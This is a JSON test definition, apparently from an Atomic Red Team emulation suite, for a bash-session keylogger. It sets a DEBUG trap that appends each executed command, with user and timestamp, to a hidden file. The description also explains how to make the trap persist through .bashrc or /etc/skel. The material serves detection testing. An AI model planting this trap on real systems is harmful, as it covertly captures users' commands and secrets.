{
  "id": "7f85a946-a0ea-48aa-b6ac-8ff539278258",
  "name": "Bash session based keylogger",
  "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "b9ed75bd-40c3-416b-b747-c0fcf0c6a6d3",
      "type": "execute-command",
      "data": {
        "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" \u003e\u003e #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}\n",
        "command_type": "bash"
      },
      "elevation_required": false
    },
    {
      "id": "436608f1-a769-453c-af86-9f7708fb2c5e",
      "type": "execute-command",
      "data": {
        "command": "rm #{output_file}\n",
        "command_type": "bash"
      },
      "elevation_required": false
    },
    {
      "id": "133b6750-fbba-4a61-9ae1-3412988fe795",
      "name": "Check dependency 1/1",
      "description": "This test requires to be run in a bash shell\n",
      "type": "execute-command",
      "data": {
        "command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "30e99f9f-6d7d-4c14-a7c7-65e7f9392fba",
      "name": "Resolve dependency 1/1",
      "description": "This test requires to be run in a bash shell\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b9508a74-9e60-4c6e-87da-2ccccc5eafa8",
      "name": "Re-check dependency 1/1",
      "description": "This test requires to be run in a bash shell\n",
      "type": "execute-command",
      "data": {
        "command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "b9ed75bd-40c3-416b-b747-c0fcf0c6a6d3",
      "p": "on-success",
      "o": "436608f1-a769-453c-af86-9f7708fb2c5e"
    },
    {
      "s": "b9ed75bd-40c3-416b-b747-c0fcf0c6a6d3",
      "p": "on-failure",
      "o": "436608f1-a769-453c-af86-9f7708fb2c5e"
    },
    {
      "s": "133b6750-fbba-4a61-9ae1-3412988fe795",
      "p": "on-success",
      "o": "b9ed75bd-40c3-416b-b747-c0fcf0c6a6d3"
    },
    {
      "s": "133b6750-fbba-4a61-9ae1-3412988fe795",
      "p": "on-failure",
      "o": "30e99f9f-6d7d-4c14-a7c7-65e7f9392fba"
    },
    {
      "s": "30e99f9f-6d7d-4c14-a7c7-65e7f9392fba",
      "p": "on-success",
      "o": "b9508a74-9e60-4c6e-87da-2ccccc5eafa8"
    },
    {
      "s": "b9508a74-9e60-4c6e-87da-2ccccc5eafa8",
      "p": "on-failure",
      "o": "b9ed75bd-40c3-416b-b747-c0fcf0c6a6d3"
    }
  ],
  "tags": [
    "T1056.001",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "output_file",
      "type": "string",
      "description": "File to store captured commands",
      "value": "/tmp/.keyboard.log"
    }
  ]
}